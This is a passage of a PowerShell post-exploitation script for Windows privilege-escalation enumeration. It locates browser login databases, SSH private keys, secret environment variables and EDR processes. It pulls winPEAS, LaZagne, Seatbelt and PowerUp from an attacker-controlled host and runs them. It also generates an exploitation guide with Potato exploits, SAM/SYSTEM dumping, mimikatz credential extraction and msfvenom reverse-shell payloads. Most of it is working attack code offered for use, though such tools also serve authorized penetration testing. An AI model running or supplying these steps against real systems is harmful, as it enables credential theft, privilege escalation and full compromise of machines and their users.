    Write-Status "Checking antivirus/EDR status..."
    
    $av = @{}
    
    try {
        $avProducts = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
        $av.Products = $avProducts | Select-Object displayName, pathToSignedProductExe, pathToSignedReportingExe, productState
    }
    catch { }
    
    try {
        $defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defender) {
            $av.DefenderEnabled = $defender.AntivirusEnabled
            $av.DefenderRealTimeProtection = $defender.RealTimeProtectionEnabled
            $av.DefenderSignatureVersion = $defender.AntivirusSignatureVersion
            $av.DefenderLastFullScan = $defender.FullScanEndTime
            
            $exclusions = Get-MpPreference -ErrorAction SilentlyContinue
            $av.DefenderExclusions = @{
                Paths = $exclusions.ExclusionPath
                Extensions = $exclusions.ExclusionExtension
                Processes = $exclusions.ExclusionProcess
            }
            
            if ($exclusions.ExclusionPath -or $exclusions.ExclusionExtension -or $exclusions.ExclusionProcess) {
                Add-Finding -Category "Antivirus" -Description "Defender exclusions configured" -Details ($av.DefenderExclusions | ConvertTo-Json) -Priority 2
            }
        }
    }
    catch { }
    
    $edrProcesses = @('CylanceSvc', 'CylanceUI', 'CrowdStrike', 'CSFalcon', 'cb', 'CarbonBlack', 'SentinelAgent', 'SentinelOne', 'Tanium', 'Sophos', 'Symantec', 'McAfee', 'ESET', 'Kaspersky', 'Trend Micro', 'Cortex', 'Cybereason', 'Elastic')
    
    $runningEDR = @()
    foreach ($edr in $edrProcesses) {
        $proc = Get-Process -Name "*$edr*" -ErrorAction SilentlyContinue
        if ($proc) {
            $runningEDR += $proc.ProcessName
        }
    }
    if ($runningEDR.Count -gt 0) {
        $av.EDRProcesses = $runningEDR
        Add-Finding -Category "Antivirus" -Description "EDR/AV processes detected" -Details ($runningEDR -join ', ') -Priority 3
    }
    
    $Global:Results.Antivirus = $av
    return $av
}

function Get-BitLockerStatus {
    Write-Status "Checking BitLocker status..."
    
    $bitlocker = @{}
    
    try {
        $blStatus = Get-BitLockerVolume -ErrorAction SilentlyContinue
        $bitlocker.Volumes = $blStatus | Select-Object MountPoint, EncryptionMethod, VolumeStatus, ProtectionStatus, LockStatus, EncryptionPercentage
        
        foreach ($vol in $blStatus) {
            if ($vol.ProtectionStatus -eq 'Off') {
                Add-Finding -Category "BitLocker" -Description "BitLocker protection OFF for $($vol.MountPoint)" -Details "Volume is decrypted or protection suspended" -Priority 2
            }
        }
    }
    catch {
        $bitlocker.Error = "BitLocker cmdlets not available or access denied"
    }
    
    $Global:Results.BitLocker = $bitlocker
    return $bitlocker
}

function Get-HotfixInfo {
    Write-Status "Checking installed hotfixes..."
    
    $hotfixes = @{}
    
    try {
        $hf = Get-HotFix -ErrorAction SilentlyContinue | Sort-Object InstalledOn -Descending
        $hotfixes.All = $hf | Select-Object HotFixID, Description, InstalledBy, InstalledOn
        $hotfixes.Latest = $hf | Select-Object -First 1
        $hotfixes.Count = $hf.Count
        
        if ($hf.Count -lt 10) {
            Add-Finding -Category "Hotfixes" -Description "Very few hotfixes installed" -Details "Only $($hf.Count) hotfixes found - system may be unpatched" -Priority 2
        }
        
        $latestHotfix = $hf | Select-Object -First 1
        if ($latestHotfix.InstalledOn) {
            $daysSinceUpdate = (Get-Date) - $latestHotfix.InstalledOn
            if ($daysSinceUpdate.Days -gt 90) {
                Add-Finding -Category "Hotfixes" -Description "System not updated recently" -Details "Last hotfix: $($latestHotfix.HotFixID) installed $($daysSinceUpdate.Days) days ago" -Priority 2
            }
        }
    }
    catch {
        try {
            $hotfixes.WMIC = wmic qfe list brief 2>$null
        }
        catch {
            $hotfixes.Error = $_.Exception.Message
        }
    }
    
    $Global:Results.Hotfixes = $hotfixes
    return $hotfixes
}

function Get-TokenInfo {
    Write-Status "Analyzing token information..."
    
    $tokenInfo = @{}
    
    try {
        $tokenInfo.Groups = whoami /groups /fo csv 2>$null | ConvertFrom-Csv
        $tokenInfo.Privileges = whoami /priv /fo csv 2>$null | ConvertFrom-Csv
        $tokenInfo.Claims = whoami /claims /fo csv 2>$null | ConvertFrom-Csv
        
        $integrityLevel = $tokenInfo.Groups | Where-Object { $_.'Group Name' -match 'Mandatory Label' }
        if ($integrityLevel) {
            $tokenInfo.IntegrityLevel = $integrityLevel.'Group Name'
            Add-Finding -Category "Token" -Description "Integrity Level: $($integrityLevel.'Group Name')" -Details "Current process integrity level" -Priority 3
        }
    }
    catch {
        $tokenInfo.Error = $_.Exception.Message
    }
    
    $Global:Results.TokenInfo = $tokenInfo
    return $tokenInfo
}

function Get-BrowserCredentials {
    Write-Status "Checking browser artifacts..."
    
    $browser = @{}
    
    $browserPaths = @{
        Chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        Firefox = "$env:APPDATA\Mozilla\Firefox\Profiles"
        Edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        Brave = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    }
    
    foreach ($b in $browserPaths.GetEnumerator()) {
        if (Test-Path $b.Value -ErrorAction SilentlyContinue) {
            $browser[$b.Key] = @{
                Path = $b.Value
                Exists = $true
            }
            
            $loginData = Get-ChildItem $b.Value -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
            $cookies = Get-ChildItem $b.Value -Recurse -Filter "Cookies" -ErrorAction SilentlyContinue
            $history = Get-ChildItem $b.Value -Recurse -Filter "History" -ErrorAction SilentlyContinue
            
            if ($loginData) {
                $browser[$b.Key].LoginData = $loginData.FullName
                Add-Finding -Category "Browser" -Description "$($b.Key) Login Data found" -Details "Path: $($loginData.FullName)" -Priority 2
            }
            if ($cookies) { $browser[$b.Key].Cookies = $cookies.FullName }
            if ($history) { $browser[$b.Key].History = $history.FullName }
        }
    }
    
    $Global:Results.Browser = $browser
    return $browser
}

function Get-SSHKeys {
    Write-Status "Checking for SSH keys..."
    
    $ssh = @{}
    
    $sshPaths = @(
        "$env:USERPROFILE\.ssh",
        "$env:USERPROFILE\ssh",
        "$env:USERPROFILE\Documents\.ssh"
    )
    
    foreach ($sshPath in $sshPaths) {
        if (Test-Path $sshPath -ErrorAction SilentlyContinue) {
            try {
                $keys = Get-ChildItem $sshPath -ErrorAction SilentlyContinue
                $ssh[$sshPath] = $keys | Select-Object Name, FullName, Length, LastWriteTime
                
                foreach ($key in $keys) {
                    if ($key.Name -match 'id_rsa|id_dsa|id_ecdsa|id_ed25519' -and $key.Name -notmatch '\.pub$') {
                        Add-Finding -Category "SSH" -Description "SSH private key found" -Details "Path: $($key.FullName)" -Priority 1
                    }
                    if ($key.Name -eq 'known_hosts') {
                        Add-Finding -Category "SSH" -Description "SSH known_hosts found" -Details "Path: $($key.FullName)" -Priority 2
                    }
                }
            }
            catch { }
        }
    }
    
    $Global:Results.SSH = $ssh
    return $ssh
}

function Get-InterestingEnvironment {
    Write-Status "Checking environment variables..."
    
    $envVars = @{}
    
    $interestingVars = @('PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'API', 'CREDENTIAL', 'CONN', 'DATABASE', 'DB_')
    
    $allEnv = Get-ChildItem Env: -ErrorAction SilentlyContinue
    $envVars.All = $allEnv | Select-Object Name, Value
    
    foreach ($var in $allEnv) {
        foreach ($pattern in $interestingVars) {
            if ($var.Name -like "*$pattern*" -or $var.Value -like "*$pattern*") {
                Add-Finding -Category "Environment" -Description "Interesting environment variable: $($var.Name)" -Details "Value: $($var.Value)" -Priority 2
                break
            }
        }
    }
    
    $Global:Results.Environment = $envVars
    return $envVars
}

function Get-RecentFiles {
    Write-Status "Checking recent files..."
    
    $recent = @{}
    
    $recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
    if (Test-Path $recentPath -ErrorAction SilentlyContinue) {
        try {
            $recentFiles = Get-ChildItem $recentPath -ErrorAction SilentlyContinue | 
                Sort-Object LastWriteTime -Descending |
                Select-Object -First 50 Name, LastWriteTime
            $recent.Files = $recentFiles
        }
        catch { }
    }
    
    $Global:Results.RecentFiles = $recent
    return $recent
}

function Invoke-AutomatedToolDownload {
    param(
        [string]$AttackerIP,
        [int]$AttackerPort
    )
    
    Write-Status "Automated Tool Integration" "INFO"
    Write-Host ""
    Write-Host "Run these commands on your ATTACK BOX to serve enumeration tools:"
    Write-Host ""
    Write-Host "Step 1 - Create tools directory and download:"
    Write-Host "  mkdir -p /tmp/privesc && cd /tmp/privesc"
    Write-Host ""
    Write-Host "Step 2 - Download tools (run each line):"
    Write-Host "  wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O winPEAS64.exe"
    Write-Host "  wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe -O winPEAS32.exe"
    Write-Host "  wget https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1 -O PowerUp.ps1"
    Write-Host "  wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe -O Seatbelt.exe"
    Write-Host "  wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe -O LaZagne.exe"
    Write-Host "  wget https://github.com/itm4n/PrivescCheck/raw/master/PrivescCheck.ps1 -O PrivescCheck.ps1"
    Write-Host ""
    Write-Host "Step 3 - Start HTTP server:"
    Write-Host "  python3 -m http.server $AttackerPort"
    Write-Host ""
    Write-Host "Press ENTER when the server is running..."
    Read-Host | Out-Null
    
    $toolsDir = "$env:TEMP\$(Get-Random -Minimum 10000 -Maximum 99999)"
    New-Item -ItemType Directory -Path $toolsDir -Force | Out-Null
    
    $tools = @{
        'winPEAS' = if ([Environment]::Is64BitOperatingSystem) { 'winPEAS64.exe' } else { 'winPEAS32.exe' }
        'PowerUp' = 'PowerUp.ps1'
        'Seatbelt' = 'Seatbelt.exe'
        'LaZagne' = 'LaZagne.exe'
        'PrivescCheck' = 'PrivescCheck.ps1'
    }
    
    $downloaded = @{}
    
    foreach ($tool in $tools.GetEnumerator()) {
        Write-Status "Downloading $($tool.Key)..."
        try {
            $url = "http://${AttackerIP}:${AttackerPort}/$($tool.Value)"
            $outPath = Join-Path $toolsDir $tool.Value
            
            $wc = New-Object System.Net.WebClient
            $wc.DownloadFile($url, $outPath)
            
            if (Test-Path $outPath) {
                $downloaded[$tool.Key] = $outPath
                Write-Status "$($tool.Key) downloaded successfully" "SUCCESS"
            }
        }
        catch {
            Write-Status "Failed to download $($tool.Key): $($_.Exception.Message)" "WARNING"
        }
    }
    
    return @{
        Directory = $toolsDir
        Tools = $downloaded
    }
}

function Invoke-AutomatedTools {
    param(
        [hashtable]$ToolPaths,
        [string]$OutputDir
    )
    
    if (-not $ToolPaths -or $ToolPaths.Tools.Count -eq 0) {
        Write-Status "No automated tools available" "WARNING"
        return
    }
    
    Write-Status "Running automated enumeration tools..."
    
    foreach ($tool in $ToolPaths.Tools.GetEnumerator()) {
        $toolName = $tool.Key
        $toolPath = $tool.Value
        
        if (-not (Test-Path $toolPath)) { continue }
        
        Write-Status "Running $toolName..."
        $outFile = Join-Path $OutputDir "$toolName`_output.txt"
        
        try {
            switch ($toolName) {
                'winPEAS' {
                    $output = & $toolPath 2>&1
                    $output | Out-File $outFile -Encoding UTF8
                }
                'Seatbelt' {
                    $output = & $toolPath -group=all 2>&1
                    $output | Out-File $outFile -Encoding UTF8
                }
                'LaZagne' {
                    $output = & $toolPath all 2>&1
                    $output | Out-File $outFile -Encoding UTF8
                }
                'PowerUp' {
                    . $toolPath
                    $output = Invoke-AllChecks 2>&1
                    $output | Out-File $outFile -Encoding UTF8
                }
                'PrivescCheck' {
                    . $toolPath
                    $output = Invoke-PrivescCheck 2>&1
                    $output | Out-File $outFile -Encoding UTF8
                }
            }
            Write-Status "$toolName completed - output saved to $outFile" "SUCCESS"
        }
        catch {
            Write-Status "$toolName failed: $($_.Exception.Message)" "ERROR"
        }
    }
}

function Export-Results {
    param([string]$OutputPath)
    
    if ([string]::IsNullOrWhiteSpace($OutputPath)) {
        $OutputPath = Join-Path $env:TEMP "PrivEsc_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    }
    
    if (-not (Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
    }
    
    Write-Status "Exporting results to $OutputPath..."
    
    $Global:Results | ConvertTo-Json -Depth 10 | Out-File (Join-Path $OutputPath "full_results.json") -Encoding UTF8
    
    $summary = @"
WINDOWS PRIVILEGE ESCALATION ENUMERATION REPORT
Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Target: $($Global:Results.SystemContext.Hostname)
User: $($Global:Results.SystemContext.Username)
OS: $($Global:Results.SystemContext.OSName) $($Global:Results.SystemContext.OSVersion)

HIGH PRIORITY FINDINGS ($($Global:HighPriority.Count))
$(if ($Global:HighPriority.Count -gt 0) {
    $Global:HighPriority | ForEach-Object {
        "[$($_.Priority)] [$($_.Category)] $($_.Description)`n    $($_.Details)"
    } | Out-String
} else {
    "No high priority findings"
})

ALL FINDINGS ($($Global:Findings.Count))
$(
    $Global:Findings | Group-Object Category | ForEach-Object {
        "`n=== $($_.Name) ($($_.Count)) ===`n"
        $_.Group | ForEach-Object {
            "  [$($_.Priority)] $($_.Description)`n      $($_.Details)"
        } | Out-String
    } | Out-String
)
"@
    
    $summary | Out-File (Join-Path $OutputPath "summary.txt") -Encoding UTF8
    
    $exploitGuide = @"
EXPLOITATION GUIDE
Based on findings from enumeration

"@
    
    foreach ($finding in $Global:HighPriority) {
        switch -Regex ($finding.Category) {
            'Privileges' {
                if ($finding.Description -match 'SeImpersonatePrivilege') {
                    $exploitGuide += @"

=== SEIMPERSONATEPRIVILEGE EXPLOITATION ===
Finding: $($finding.Description)

Attack vectors:
1. PrintSpoofer:
   PrintSpoofer64.exe -i -c cmd

2. GodPotato:
   GodPotato.exe -cmd "cmd /c whoami"

3. JuicyPotato (older systems):
   JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

4. RoguePotato:
   RoguePotato.exe -r YOUR_IP -e "cmd.exe /c whoami" -l 9999

"@
                }
                elseif ($finding.Description -match 'SeBackupPrivilege') {
                    $exploitGuide += @"

=== SEBACKUPPRIVILEGE EXPLOITATION ===
Finding: $($finding.Description)

Attack:
1. Copy SAM and SYSTEM:
   reg save hklm\sam C:\temp\sam
   reg save hklm\system C:\temp\system

2. Extract on attack box:
   secretsdump.py -sam sam -system system LOCAL

"@
                }
                elseif ($finding.Description -match 'SeDebugPrivilege') {
                    $exploitGuide += @"

=== SEDEBUGPRIVILEGE EXPLOITATION ===
Finding: $($finding.Description)

Attack:
1. Migrate to SYSTEM process:
   - Use procdump to dump lsass.exe
   - Parse with mimikatz

2. Direct mimikatz:
   privilege::debug
   sekurlsa::logonpasswords

"@
                }
            }
            'Services' {
                if ($finding.Description -match 'Writable service binary') {
                    $exploitGuide += @"

=== WRITABLE SERVICE BINARY ===
Finding: $($finding.Description)
$($finding.Details)

Attack:
1. Backup original:
   copy "ORIGINAL_PATH" "ORIGINAL_PATH.bak"

2. Replace with payload:
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > payload.exe
   copy payload.exe "ORIGINAL_PATH"

3. Restart service:
   sc stop SERVICE_NAME
   sc start SERVICE_NAME

"@
                }
                elseif ($finding.Description -match 'Unquoted service path') {
                    $exploitGuide += @"

=== UNQUOTED SERVICE PATH ===
Finding: $($finding.Description)
$($finding.Details)

Attack:
1. Identify writable directory in path
2. Place malicious exe at path break:
   Example path: C:\Program Files\Some App\service.exe
   Place: C:\Program.exe or C:\Program Files\Some.exe

3. Generate payload:
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > Program.exe

4. Restart service

"@
                }
            }
            'AlwaysInstallElevated' {
                $exploitGuide += @"

=== ALWAYSINSTALLELEVATED ===
Finding: $($finding.Description)

Attack:
1. Generate malicious MSI:
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi

2. Execute:
   msiexec /quiet /qn /i shell.msi

"@
            }
            'PathHijacking' {
                $exploitGuide += @"

=== PATH HIJACKING ===
Finding: $($finding.Description)
$($finding.Details)

Attack:
1. Identify commonly called executables
2. Place malicious exe in writable PATH directory:
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > target.exe

3. Wait for execution or trigger manually

"@
            }
            'ScheduledTasks' {
                if ($finding.Description -match 'Writable task binary') {
                    $exploitGuide += @"

=== WRITABLE SCHEDULED TASK BINARY ===
Finding: $($finding.Description)
$($finding.Details)

Attack:
1. Backup and replace binary:
   copy "ORIGINAL" "ORIGINAL.bak"
   copy payload.exe "ORIGINAL"

2. Wait for scheduled execution or trigger manually

"@
                }
            }
            'PowerShell|SensitiveFiles' {
                $exploitGuide += @"

=== CREDENTIAL DISCOVERY ===
Finding: $($finding.Description)
$($finding.Details)

Action:
1. Review file contents for passwords
2. Test discovered credentials against:
   - Local users (runas, winrm)
   - Domain users (if applicable)
   - Services (RDP, SSH, databases)

"@
            }
            'UAC' {
                if ($finding.Description -match 'DISABLED') {
                    $exploitGuide += @"

=== UAC DISABLED ===
Finding: $($finding.Description)

Impact: Any admin user runs with full privileges without prompts
No bypass needed - direct admin access

"@
                }
            }
        }
    }
    
    $exploitGuide | Out-File (Join-Path $OutputPath "exploitation_guide.txt") -Encoding UTF8
    
    $systemInfo = @"
SYSTEM INFORMATION
Hostname: $($Global:Results.SystemContext.Hostname)
Domain: $($Global:Results.SystemContext.DomainName)
OS: $($Global:Results.SystemContext.OSName)
Version: $($Global:Results.SystemContext.OSVersion)
Build: $($Global:Results.SystemContext.OSBuild)
Architecture: $($Global:Results.SystemContext.OSArch)
Is Admin: $($Global:Results.SystemContext.IsAdmin)

CURRENT USER
Username: $($Global:Results.CurrentUser.Identity)

Groups:
$($Global:Results.CurrentUser.Groups | Format-Table | Out-String)

Privileges:
$($Global:Results.CurrentUser.Privileges | Format-Table | Out-String)
"@
    
    $systemInfo | Out-File (Join-Path $OutputPath "system_info.txt") -Encoding UTF8
    
    if ($Global:Results.Services.All) {
        $Global:Results.Services.All | Export-Csv (Join-Path $OutputPath "services.csv") -NoTypeInformation
    }
    
    if ($Global:Results.ScheduledTasks.Details) {
        $Global:Results.ScheduledTasks.Details | Export-Csv (Join-Path $OutputPath "scheduled_tasks.csv") -NoTypeInformation
    }
    
    if ($Global:Results.Software.Installed) {
        $Global:Results.Software.Installed | Export-Csv (Join-Path $OutputPath "installed_software.csv") -NoTypeInformation
    }
    
    Write-Status "Results exported to: $OutputPath" "SUCCESS"
    return $OutputPath
}

function Show-Summary {
    Write-Host ""
    Write-Host "=" * 60
    Write-Host "ENUMERATION COMPLETE"
    Write-Host "=" * 60
    Write-Host ""
    Write-Host "Target: $($Global:Results.SystemContext.Hostname)"
    Write-Host "User: $($Global:Results.SystemContext.Username)"
    Write-Host "Admin: $($Global:Results.SystemContext.IsAdmin)"
    Write-Host ""
    Write-Host "Total Findings: $($Global:Findings.Count)"
    Write-Host "High Priority: $($Global:HighPriority.Count)"
    Write-Host ""
    
    if ($Global:HighPriority.Count -gt 0) {
        Write-Host "HIGH PRIORITY FINDINGS:"
        Write-Host "-" * 40
        foreach ($finding in $Global:HighPriority) {
            Write-Host "[!] [$($finding.Category)] $($finding.Description)"
            Write-Host "    $($finding.Details)"
            Write-Host ""
        }
    }
    
    Write-Host ""
    Write-Host "Findings by Category:"
    $Global:Findings | Group-Object Category | ForEach-Object {
        Write-Host "  $($_.Name): $($_.Count)"
    }
}

function Start-Enumeration {
    param(
        [string]$IP,
        [int]$Port,
        [string]$Output,
        [switch]$QuickMode,
        [switch]$FullMode,
        [switch]$ExportOnlyMode
    )
    
    if (-not $IP) {
        $IP = Get-Input -Prompt "Enter attacker IP address" -Default "127.0.0.1"
    }
    
    if (-not $Port) {
        $Port = [int](Get-Input -Prompt "Enter attacker port for tool serving" -Default "8000")
    }
    
    if (-not $Output) {
        $Output = Join-Path $env:TEMP "PrivEsc_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    }
    
    Write-Status "Starting enumeration..."
    Write-Status "Attacker: ${IP}:${Port}"
    Write-Status "Output: $Output"
    Write-Host ""
    
    Get-SystemContext
    Get-CurrentUserInfo
    Get-LocalUsers
    Get-LocalGroups
    Get-NetworkInfo
    Get-InstalledSoftware
    Get-RunningProcesses
    Get-Services
    Get-ScheduledTasks
    Get-RegistryAutoRuns
    Get-SensitiveFiles
    Get-PowerShellHistory
    Get-StoredCredentials
    Get-AlwaysInstallElevated
    Get-PathHijacking
    Get-DLLHijacking
    Get-UACSettings
    Get-AntivirusInfo
    Get-BitLockerStatus
    Get-HotfixInfo
    Get-TokenInfo
    Get-BrowserCredentials
    Get-SSHKeys
    Get-InterestingEnvironment
    Get-RecentFiles
    
    if ($FullMode -and -not $ExportOnlyMode) {
        Write-Host ""
        $runTools = Get-Input -Prompt "Run automated tools (winPEAS, Seatbelt, etc.)? [y/N]" -Default "N"
        if ($runTools -eq 'y' -or $runTools -eq 'Y') {
            $toolPaths = Invoke-AutomatedToolDownload -AttackerIP $IP -AttackerPort $Port
            if ($toolPaths.Tools.Count -gt 0) {
                Invoke-AutomatedTools -ToolPaths $toolPaths -OutputDir $Output
            }
        }
    }
    
    $outputPath = Export-Results -OutputPath $Output
    Show-Summary
    
    Write-Host ""
    Write-Status "All results saved to: $outputPath" "SUCCESS"
    Write-Host ""
    Write-Host "Files generated:"
    Get-ChildItem $outputPath | ForEach-Object { Write-Host "  - $($_.Name)" }
}

if ($ExportOnly) {
    Export-Results -OutputPath $OutputPath
}
elseif ($AttackerIP -or $Quick -or $Full) {
    Start-Enumeration -IP $AttackerIP -Port $AttackerPort -Output $OutputPath -QuickMode:$Quick -FullMode:$Full -ExportOnlyMode:$ExportOnly
}
else {
    Write-Host ""
    Write-Host "Windows Privilege Escalation Enumeration"
    Write-Host "=" * 40
    Write-Host ""
    Write-Host "Usage:"
    Write-Host "  .\WinPrivEsc.ps1                     # Interactive mode"
    Write-Host "  .\WinPrivEsc.ps1 -AttackerIP 10.10.14.1 -AttackerPort 8000"
    Write-Host "  .\WinPrivEsc.ps1 -Quick              # Basic enumeration only"
    Write-Host "  .\WinPrivEsc.ps1 -Full               # Full enumeration + tools"
    Write-Host ""
    
    $mode = Get-Input -Prompt "Select mode [1=Quick, 2=Full, 3=Exit]" -Default "2"
    
    switch ($mode) {
        "1" { Start-Enumeration -QuickMode }
        "2" { Start-Enumeration -FullMode }
        "3" { exit }
        default { Start-Enumeration -FullMode }
    }
}
